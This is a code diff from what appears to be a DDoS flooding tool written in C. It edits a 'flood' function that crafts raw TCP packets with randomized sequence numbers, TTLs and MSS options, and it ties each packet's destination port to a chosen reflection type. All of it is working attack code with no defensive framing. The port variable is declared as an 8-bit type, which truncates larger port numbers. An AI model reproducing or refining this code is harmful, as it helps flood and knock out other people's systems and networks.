@@ -295,7 +295,7 @@ void *flood(void *par1)
 		opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
 		setup_tcpopts_header(opts);
 		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
-		tcph->dest = htons(ports[randnum(0, sizeof_ports)]);
+		/*tcph->dest = htons(ports[randnum(0, sizeof_ports)]);*/
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		tcph->seq = htonl(randnum(1000000, 9999999)); // Custom sequence number
 		iph->ttl = randnum(64, 255);
@@ -323,6 +323,8 @@ void *flood(void *par1)
 		}
 
 		uint8_t reflectionType = ports[randnum(0, sizeof_ports)];
+
+		tcph->dest = htons(reflectionType);
 
 		if (reflectionType == 80)
 		{
